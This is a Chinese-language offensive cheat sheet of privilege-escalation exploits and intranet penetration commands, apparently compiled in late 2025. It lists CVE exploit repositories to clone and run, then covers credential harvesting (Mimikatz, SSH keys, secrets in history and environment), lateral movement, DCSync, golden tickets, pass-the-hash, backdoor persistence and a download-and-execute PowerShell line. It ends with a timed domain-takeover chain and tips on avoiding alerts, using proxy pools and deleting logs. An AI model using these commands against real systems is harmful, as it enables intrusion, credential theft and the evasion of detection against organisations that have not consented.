# 2025最新提权与内网渗透技术库

## 🔥 2025年最新提权CVE（Critical）

### Windows提权

**CVE-2025-29824 - CLFS本地提权**
```bash
# CLFS (Common Log File System) 本地提权漏洞
# 影响: Windows 10/11, Windows Server 2016+
# 利用: 从普通用户提升到SYSTEM

# PoC位置
git clone https://github.com/zmkeh/CVE-2025-29824-CLFS-Local-privilege-escalation
cd CVE-2025-29824-CLFS-Local-privilege-escalation
make
./exploit.exe

# 验证提权
whoami  # 应显示: NT AUTHORITY\SYSTEM
```

**CVE-2025-54918 - NTLM认证绕过提权**
```bash
# Windows NTLM认证绕过，从低权限到SYSTEM
# 攻击链: CVE-2025-55226 (RCE) → CVE-2025-54918 (提权)

# 利用链
# 1. 初始RCE (CVE-2025-55226)
# 2. NTLM绕过 (CVE-2025-54918)
# 3. 获取SYSTEM权限

# 检测脚本
powershell -ExecutionPolicy Bypass -File detect_cve_2025_54918.ps1

# 利用
git clone https://github.com/mrk336/From-Foothold-to-Domain-Admin-Weaponizing-CVE-2025-54918-in-Real-World-DevOps
cd From-Foothold-to-Domain-Admin-Weaponizing-CVE-2025-54918-in-Real-World-DevOps
python3 exploit.py
```

**CVE-2025-55234 - 路径补丁绕过**
```bash
# Patch-the-Path漏洞，绕过Windows路径保护
git clone https://github.com/mrk336/Patch-the-Path-CVE-2025-55234-Detection-Defense
cd Patch-the-Path-CVE-2025-55234-Detection-Defense
python3 exploit.py
```

**CVE-2025-54110 - Windows提权**
```bash
# Windows本地提权漏洞
git clone https://github.com/ByteHawkSec/CVE-2025-54110-POC
cd CVE-2025-54110-POC
make
./exploit.exe
```

**CVE-2025-10576 - 提权漏洞**
```bash
git clone https://github.com/R41N3RZUF477/CVE-2025-10576
cd CVE-2025-10576
python3 exploit.py
```

**CVE-2025-6934 - 提权漏洞**
```bash
git clone https://github.com/Pwdnx1337/CVE-2025-6934
cd CVE-2025-6934
make && ./exploit
```

### Linux提权

**CVE-2025-32463 - chroot提权**
```bash
# chroot环境逃逸提权
git clone https://github.com/ashardev002/CVE-2025-32463_chwoot
cd CVE-2025-32463_chwoot
gcc exploit.c -o exploit
./exploit

# 或使用其他PoC
git clone https://github.com/Nowafen/CVE-2025-32463
cd CVE-2025-32463
python3 exploit.py
```

**CVE-2025-27591 - Linux提权**
```bash
git clone https://github.com/HOEUN-Visai/CVE-2025-27591-below-
cd CVE-2025-27591-below-
make
./exploit
```

### 云环境提权

**CVE-2025-54914 - Azure网络提权**
```bash
# Azure网络权限提升
git clone https://github.com/mrk336/Azure-Networking-Privilege-Escalation-Exploit-CVE-2025-54914
cd Azure-Networking-Privilege-Escalation-Exploit-CVE-2025-54914
python3 exploit.py --target azure-resource
```

---

## 🎯 2025最新内网渗透技术

### Active Directory攻击

**AD-BadSuccessor-Audit - AD路径审计**
```bash
# AD环境中的BadSuccessor路径发现
git clone https://github.com/sxyrxyy/AD-BadSuccessor-Audit
cd AD-BadSuccessor-Audit
python3 audit.py -d domain.local -u user -p password
```

### 内网横向移动

**1. Kerberoasting自动化**
```bash
# 获取SPN账户hash
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt

# 爆破hash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**2. AS-REP Roasting**
```bash
# 获取不需要预认证的账户
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -outputfile asrep_hashes.txt

# 爆破
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**3. NTLM Relay自动化**
```bash
# 监听并中继
ntlmrelayx.py -tf targets.txt -smb2support -socks

# 通过SOCKS代理横向
proxychains secretsdump.py domain/user:password@target
```

**4. BloodHound自动化收集**
```bash
# 收集AD数据
SharpHound.exe -c All,GPOLocalGroup -d domain.local --zipfilename bh_$(date +%Y%m%d).zip

# 上传到BloodHound
bloodhound --import bh_20251106.zip

# 查询最短路径
MATCH (u:User {name: "USER@DOMAIN.LOCAL"}), (da:Computer {name: "DC01.DOMAIN.LOCAL"}), p=shortestPath((u)-[*1..]->(da)) RETURN p
```

### 凭证收集与复用

**Windows凭证收集**
```powershell
# Mimikatz内存提取
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# SharpKatz（绕过EDR）
SharpKatz.exe --Command logonpasswords

# LaZagne浏览器密码
LaZagne.exe browsers

# 凭证管理器
cmdkey /list
vaultcmd /list
```

**Linux凭证收集**
```bash
# SSH密钥
cat ~/.ssh/id_rsa
cat /root/.ssh/id_rsa
find /home -name "id_rsa" 2>/dev/null

# 配置文件密码
grep -r "password\|passwd\|pwd" /var/www/ /etc/ /opt/ 2>/dev/null
grep -r "api_key\|secret\|token" /var/www/ /opt/ 2>/dev/null

# 历史命令
cat ~/.bash_history | grep -i "password\|mysql\|ssh"
cat /root/.bash_history | grep -i "password\|mysql\|ssh"

# 环境变量
env | grep -i "pass\|key\|token"
grep -a "password" /proc/*/environ 2>/dev/null
```

### 内网扫描与发现

**快速内网扫描**
```bash
# fscan全自动扫描
fscan -h 192.168.1.1/24 -p 1-65535 -o result.txt

# 端口扫描
nmap -sn 192.168.1.0/24
nmap -sS -p- --open 192.168.1.1-254

# SMB扫描
crackmapexec smb 192.168.1.0/24 --shares
crackmapexec smb 192.168.1.0/24 -u '' -p '' --sam

# RDP扫描
crackmapexec rdp 192.168.1.0/24 -u user -p password
```

**服务发现**
```bash
# 数据库发现
nmap -p 3306,1433,5432,27017,6379 192.168.1.0/24

# Web服务发现
httpx -l targets.txt -title -tech-detect -status-code

# 管理后台发现
nuclei -l targets.txt -t ~/nuclei-templates/exposures/ -severity critical,high
```

### 横向移动技术

**1. WMI横向**
```bash
# WMI执行命令
wmiexec.py domain/user:password@192.168.1.100 "whoami"

# 批量WMI
crackmapexec winrm 192.168.1.0/24 -u user -p password -x "whoami"
```

**2. SMB横向**
```bash
# SMB执行
smbexec.py domain/user:password@192.168.1.100

# 批量SMB
crackmapexec smb 192.168.1.0/24 -u user -p password -x "whoami"
```

**3. RDP横向**
```bash
# RDP连接
xfreerdp /u:user /p:password /v:192.168.1.100

# 批量RDP测试
crackmapexec rdp 192.168.1.0/24 -u user -p password
```

**4. SSH横向**
```bash
# SSH密钥复用
ssh -i id_rsa user@192.168.1.100

# 密码复用
sshpass -p 'password' ssh user@192.168.1.100
```

**5. WinRM横向**
```bash
# WinRM执行
evil-winrm -i 192.168.1.100 -u user -p password

# 批量WinRM
crackmapexec winrm 192.168.1.0/24 -u user -p password -x "whoami"
```

### 域控攻击

**1. DCSync攻击**
```bash
# 获取域控hash
secretsdump.py domain/user:password@dc01.domain.local

# DCSync
mimikatz "lsadump::dcsync /domain:domain.local /user:Administrator"
```

**2. Golden Ticket**
```bash
# 获取krbtgt hash
secretsdump.py domain/user:password@dc01.domain.local | grep krbtgt

# 生成Golden Ticket
mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt"
```

**3. Silver Ticket**
```bash
# 生成服务票据
mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:hash /ptt"
```

**4. Pass-the-Hash**
```bash
# 使用hash认证
psexec.py -hashes :ntlm_hash domain/user@192.168.1.100
wmiexec.py -hashes :ntlm_hash domain/user@192.168.1.100
smbexec.py -hashes :ntlm_hash domain/user@192.168.1.100
```

### 持久化技术

**Windows持久化**
```powershell
# 计划任务
schtasks /create /tn "Update" /tr "C:\Windows\System32\cmd.exe" /sc onlogon /ru SYSTEM

# 服务持久化
sc create Backdoor binPath= "C:\Windows\System32\cmd.exe" start= auto
sc start Backdoor

# WMI事件订阅
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="UpdateFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

# 注册表启动项
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

**Linux持久化**
```bash
# 定时任务
echo "* * * * * /tmp/backdoor.sh" | crontab -

# 服务持久化
systemctl enable backdoor.service
systemctl start backdoor.service

# SSH密钥后门
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

---

## 🛠️ 2025最新工具更新

### 提权工具

**1. WinPEAS**
```bash
# 最新版Windows提权检查
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
winPEASx64.exe
```

**2. LinPEAS**
```bash
# Linux提权检查
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**3. PowerUp**
```powershell
# PowerShell提权检查
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

### 内网工具

**1. Impacket最新版**
```bash
# 安装最新版
pip3 install impacket --upgrade

# 常用模块
python3 /usr/local/bin/secretsdump.py
python3 /usr/local/bin/psexec.py
python3 /usr/local/bin/wmiexec.py
python3 /usr/local/bin/smbexec.py
```

**2. CrackMapExec**
```bash
# 安装最新版
pip3 install crackmapexec --upgrade

# 使用
crackmapexec smb 192.168.1.0/24 -u user -p password --shares
crackmapexec winrm 192.168.1.0/24 -u user -p password -x "whoami"
```

**3. BloodHound**
```bash
# 最新版BloodHound
docker pull bloodhound/bloodhound:latest
docker run -p 7474:7474 -p 7687:7687 bloodhound/bloodhound:latest
```

---

## 📋 实战攻击链示例

### 完整内网攻击链（30分钟）

```bash
# 阶段1: 初始立足点（5分钟）
# 已获得低权限shell

# 阶段2: 信息收集（5分钟）
hostname
ipconfig /all
net user
net localgroup administrators
net view
net share

# 阶段3: 凭证收集（5分钟）
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# 阶段4: 内网扫描（5分钟）
fscan -h 192.168.1.0/24 -p 1-65535 -o scan.txt

# 阶段5: 横向移动（5分钟）
# 使用收集的凭证横向
psexec.py domain/user:password@192.168.1.100
wmiexec.py domain/user:password@192.168.1.100

# 阶段6: 域控攻击（5分钟）
secretsdump.py domain/user:password@dc01.domain.local
mimikatz "lsadump::dcsync /domain:domain.local /user:Administrator"
```

---

## ⚠️ 注意事项

1. **所有CVE利用前先验证目标版本**
2. **内网扫描控制频率，避免触发告警**
3. **凭证收集后立即横向，不等待**
4. **使用代理池降低单IP风险**
5. **清理痕迹，删除日志**

---

**最后更新: 2025-11-06**
**来源: GitHub最新PoC + NVD + 实战经验**
